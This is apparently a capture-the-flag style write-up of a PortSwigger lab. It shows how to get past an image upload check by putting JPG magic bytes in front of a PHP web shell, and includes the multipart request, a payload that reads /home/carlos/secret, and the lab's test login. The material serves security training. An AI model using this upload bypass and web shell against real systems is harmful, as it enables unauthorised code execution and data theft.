
# Remote code execution via polyglot web shell upload

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter


---------------------------------------------

References: 

- https://portswigger.net/web-security/file-upload



![img](images/Remote%20code%20execution%20via%20polyglot%20web%20shell%20upload/1.png)

---------------------------------------------

I uploaded a real JPG file and deleted as many bytes as possible. This is the least you can send so the server still finds it is a JPG image:



![img](images/Remote%20code%20execution%20via%20polyglot%20web%20shell%20upload/2.png)


So we can change everything to update a PHP file like this:

```
POST /my-account/avatar HTTP/2
...
-----------------------------223006367629168816071656253944
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: text/php

<--JPG MAGIC NUMBER-->

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------223006367629168816071656253944
...
```



![img](images/Remote%20code%20execution%20via%20polyglot%20web%20shell%20upload/3.png)


And then access /files/avatars/test.php to read the content of the file:



![img](images/Remote%20code%20execution%20via%20polyglot%20web%20shell%20upload/4.png)
